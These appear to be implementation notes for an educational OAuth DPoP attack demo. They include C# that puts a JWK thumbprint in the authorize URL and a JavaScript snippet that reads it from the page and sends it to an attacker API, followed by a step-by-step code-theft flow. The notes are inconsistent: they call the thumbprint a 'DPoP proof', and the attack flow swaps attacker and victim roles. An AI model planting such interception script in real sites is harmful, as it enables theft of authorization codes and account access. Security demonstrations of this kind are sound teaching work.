# DPoP Authorization Code Binding - Implementation Notes

## Overview

The WebClient now sends a DPoP JKT (JWK Thumbprint) with the authorize request per [DPoP RFC Section 10](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-dpop#section-10), binding the authorization code to the DPoP key. This thumbprint is visible in the URL and can be intercepted by malicious JavaScript for the attack demonstration.

## How It Works

### 1. Shared DPoP Key Creation

**File:** `WebClient/Program.cs` (startup)

A single RSA key pair is created and shared across the entire application:

```csharp
// Create a shared DPoP key for both authorize and token endpoints
var sharedRsaKey = new RsaSecurityKey(RSA.Create(2048));
var sharedJwk = JsonWebKeyConverter.ConvertFromSecurityKey(sharedRsaKey);
sharedJwk.Alg = "PS256";

// Initialize the DPoP proof generator with the shared key
DPoPProofGenerator.Initialize(sharedRsaKey, sharedJwk);
```

This key is used for:
- **Authorize endpoint** - DPoP proof in query parameter
- **Token endpoint** - DPoP proof in HTTP header (via `AddOpenIdConnectAccessTokenManagement`)
- **API calls** - DPoP proofs for protected resource requests

### 2. DPoP Proof Generation (Server-Side)

**File:** `WebClient/DPoPProofGenerator.cs`

- Uses the shared RSA key (initialized at startup)
- Creates a JWT with the following claims:
  - `htm`: HTTP method ("GET")
  - `htu`: HTTP URI (authorize endpoint URL)
  - `jti`: Unique JWT ID
  - `iat`: Issued at timestamp
- Signs the JWT with RS256 (RSASSA-PKCS1-v1_5 with SHA-256)
- Includes the public key (JWK) in the JWT header

### 3. Adding DPoP JKT to Authorize Request

**File:** `WebClient/Program.cs`

The `OnRedirectToIdentityProvider` event handler adds the `dpop_jkt` parameter:
```csharp
options.Events.OnRedirectToIdentityProvider = context =>
{
    // Get the JWK thumbprint for authorization code binding
    var jkt = DPoPProofGenerator.GetJwkThumbprint();
    
    // Add dpop_jkt parameter per DPoP spec section 10
    context.ProtocolMessage.SetParameter("dpop_jkt", jkt);
    
    return Task.CompletedTask;
};
```

This adds the **JWK thumbprint** as a query parameter in the authorize URL:
```
https://localhost:5001/connect/authorize?
  client_id=dpop&
  redirect_uri=https://localhost:5010/signin-oidc&
  response_type=code&
  scope=openid%20profile%20scope1%20offline_access&
  dpop_jkt=NzbLsXh8uDCcd-6MNwXF4W_7noWXFZAfHkxZsRGC9Xs
  &state=...
  &code_challenge=...
```

The `dpop_jkt` value is the **SHA-256 hash** of the JWK (base64url-encoded), which binds the authorization code to the DPoP key.

### 4. Token Management Uses Same Key

**File:** `WebClient/Program.cs`

The `AddOpenIdConnectAccessTokenManagement` configuration uses the same shared key:

```csharp
builder.Services.AddOpenIdConnectAccessTokenManagement(options =>
{
    // Use the same DPoP JWK that we're using for the authorize endpoint
    options.DPoPJsonWebKey = JsonSerializer.Serialize(sharedJwk);
});
```

This ensures:
- All DPoP proofs (authorize, token, API) use the same key pair
- The DPoP binding is consistent across the entire OAuth flow
- The Authorization Server can validate that all proofs come from the same client

### 5. JavaScript Interception (Client-Side)

**File:** `AttackerApi/wwwroot/attack.js`

The `checkCurrentUrlForDPoP()` method:
- Checks if the current page is the authorize endpoint
- Extracts the `dpop_jkt` query parameter
- Sends it to the AttackerApi for storage

```javascript
checkCurrentUrlForDPoP() {
    if (this.mode !== 'attacker') return;
    
    const currentUrl = window.location.href;
    
    if (currentUrl.includes('/connect/authorize')) {
        const urlParams = new URLSearchParams(window.location.search);
        const dpopJkt = urlParams.get('dpop_jkt');
        
        if (dpopJkt) {
            this.log(`Found DPoP JKT (thumbprint) in current URL: ${dpopJkt}`);
            this.exfiltrateDPoPProof({
                sessionId: this.sessionId,
                dpopProof: dpopJkt,
                // ... other fields
            });
        }
    }
}
```

## Attack Flow

1. **Attacker clicks "Start OAuth Flow"**
   - WebClient computes the JWK thumbprint of the DPoP key
   - Adds `dpop_jkt` parameter to the authorize URL
   - Browser redirects to IdentityServer authorize endpoint

2. **JavaScript detects the authorize page**
   - Checks the current URL for `/connect/authorize`
   - Extracts the `dpop_jkt` parameter from the query string
   - Sends the thumbprint to AttackerApi

3. **Victim polls AttackerApi**
   - Retrieves the stolen DPoP proof
   - Uses it in their own OAuth flow

4. **Victim authenticates**
   - Authorization code is generated
   - JavaScript intercepts and sends to AttackerApi

5. **Attacker retrieves stolen code**
   - Completes their OAuth flow
   - Gains unauthorized access

## Important Notes

### Query Parameter vs HTTP Header

The DPoP proof is sent as a **query parameter**, not an HTTP header. This is intentional for the attack demo because:

- Query parameters are visible in the URL
- JavaScript can easily intercept and read them
- This simulates a scenario where the DPoP proof is exposed

In a real implementation, DPoP proofs should be sent as HTTP headers (`DPoP: <proof>`), not query parameters.

### Security Implications

This implementation demonstrates why:

1. **DPoP proofs should not be in URLs** - URLs are logged, cached, and visible
2. **JavaScript access is dangerous** - Malicious scripts can intercept OAuth flows
3. **Content Security Policy (CSP) is critical** - Prevents unauthorized script execution
4. **Subresource Integrity (SRI) matters** - Ensures script integrity

### Not Standard OAuth/DPoP

This is **not** how DPoP is typically used in OAuth:

- Standard DPoP sends proofs as HTTP headers
- DPoP is usually only required for token endpoints
- Authorize endpoints don't typically require DPoP

This implementation is specifically designed for the attack demonstration.

## Testing

1. Start all services
2. Open AttackDemo page
3. Click "Initialize Attack"
4. Click "Start OAuth Flow"
5. Watch the browser console - you should see:
   ```
   [ATTACKER] Intercepting authorize redirect...
   [ATTACKER] Found DPoP proof in authorize URL: eyJhbGciOiJSUzI1NiIsInR5cCI6...
   [ATTACKER] Successfully exfiltrated DPoP proof to server
   ```

## Files Modified

- `WebClient/Program.cs` - Added OnRedirectToIdentityProvider event handler
- `WebClient/DPoPProofGenerator.cs` - New file for generating DPoP proofs
- `AttackerApi/wwwroot/attack.js` - Added interceptNavigation() method

## Educational Purpose

This demonstrates a vulnerability where sensitive OAuth parameters are exposed in URLs and can be intercepted by malicious JavaScript. Real-world OAuth implementations should:

- Use HTTP headers for sensitive data
- Implement strict CSP policies
- Use SRI for all external scripts
- Validate the origin of all requests
